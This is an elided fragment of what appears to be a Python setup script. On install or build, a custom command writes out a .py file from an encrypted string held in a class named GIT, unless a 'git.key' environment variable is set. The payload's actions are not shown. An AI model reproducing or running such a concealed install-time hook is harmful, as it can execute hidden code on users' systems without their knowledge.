...
class GIT:
	...
	test="7PNsnL1650UiIp3ofccwyTozPkf+p2a1Qu70EGRaLwdO7p0zOz6haTsQZ/es2w4yvZvXm/k=*xvz7mDczQxMzrcfc2OwK2g==*EG20F9cSJSihKfygqzUFCA==*1EzhnRucE/fgjndcJa7Egg=="
	@classmethod
	def clone(cls):
		####################### 建立一個 .py檔案 
  ...
  if sys.argv[1]== 'bdist_wheel' or sys.argv[1]== 'sdist' or  sys.argv[1]=='install' or sys.argv[1]=="egg_info" or sys.argv[1]=='clean'  or sys.argv[1]== 'build' :
    ...
    class PostCMD(install):
      ...
      def  run(self):
        ...
        ################################################
        import os
        if not "git.key" in os.environ.keys():
            GIT.clone()
